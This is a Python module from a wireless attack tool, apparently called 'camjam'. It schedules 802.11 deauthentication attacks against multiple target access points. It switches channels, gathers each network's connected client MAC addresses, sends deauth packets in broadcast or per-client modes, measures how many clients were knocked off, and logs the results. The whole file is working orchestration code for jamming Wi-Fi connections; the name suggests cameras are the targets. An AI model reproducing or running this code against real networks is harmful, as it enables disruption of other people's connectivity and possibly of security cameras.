import threading
import time
from typing import Callable, Dict, List, Optional

from camjam.engine.verifier import DeauthVerifier
from camjam.radio.deauth import DeauthRunner
from camjam.radio.interface import RadioInterface
from camjam.radio.scanner import Scanner
from camjam.store.db import Database
from camjam.store.models import DeauthMode, DeauthTarget


class MultiTargetScheduler:
    def __init__(
        self,
        *,
        interface: str,
        scanner: Scanner,
        deauth: DeauthRunner,
        db: Database,
        session_id: int,
        emit: Callable[[str, Dict], None],
        radio: RadioInterface,
    ):
        self.interface = interface
        self.scanner = scanner
        self.deauth = deauth
        self.db = db
        self.session_id = session_id
        self.emit = emit
        self.radio = radio
        self.verifier = DeauthVerifier(scanner, interface)

    def _clients_for_target(self, target: DeauthTarget, stop: threading.Event) -> List[str]:
        macs, _ = self.verifier.snapshot_clients(target.bssid, target.channel, duration=4, stop=stop)
        if macs:
            return macs
        if target.client_macs:
            return target.client_macs
        return []

    def _deauth_once(self, target: DeauthTarget, clients: List[str], packets: int) -> None:
        if target.mode == DeauthMode.ap_broadcast:
            self.deauth.deauth_ap(target.bssid, packets)
        elif target.mode == DeauthMode.selected_clients:
            for mac in (target.client_macs or clients):
                self.deauth.deauth_client(target.bssid, mac, packets)
        else:
            if clients:
                for mac in clients:
                    self.deauth.deauth_client(target.bssid, mac, packets)
            else:
                self.deauth.deauth_ap(target.bssid, packets)

    def run_round(self, targets: List[DeauthTarget], packets: int, stop: threading.Event) -> None:
        import asyncio

        for target in targets:
            if stop.is_set():
                break
            self.radio.set_channel(self.interface, target.channel)
            time.sleep(0.3)
            self.emit(
                "deauth:target",
                {"bssid": target.bssid, "ssid": target.ssid, "channel": target.channel, "mode": target.mode.value},
            )

            clients = self._clients_for_target(target, stop)
            if stop.is_set():
                break
            if not clients and target.mode != DeauthMode.ap_broadcast:
                self.emit(
                    "deauth:skip",
                    {"bssid": target.bssid, "reason": "no clients visible — try client scan or AP broadcast mode"},
                )
                continue

            def do_deauth(t=target, c=clients):
                self._deauth_once(t, c, packets)

            result = self.verifier.verify_round(target.bssid, target.channel, do_deauth, stop=stop)
            if result is None:
                break
            event_id = asyncio.run(
                self.db.record_deauth(
                    self.session_id,
                    target.bssid,
                    target.mode.value,
                    result.clients_before,
                    result.clients_after,
                    {
                        "confidence": result.confidence,
                        "message": result.message,
                        "before": result.client_macs_before,
                        "after": result.client_macs_after,
                    },
                )
            )
            self.emit(
                "deauth:result",
                {
                    "event_id": event_id,
                    "bssid": result.bssid,
                    "clients_before": result.clients_before,
                    "clients_after": result.clients_after,
                    "success": result.success,
                    "confidence": result.confidence,
                    "message": result.message,
                },
            )
        self.emit("deauth:round_complete", {"targets": len(targets)})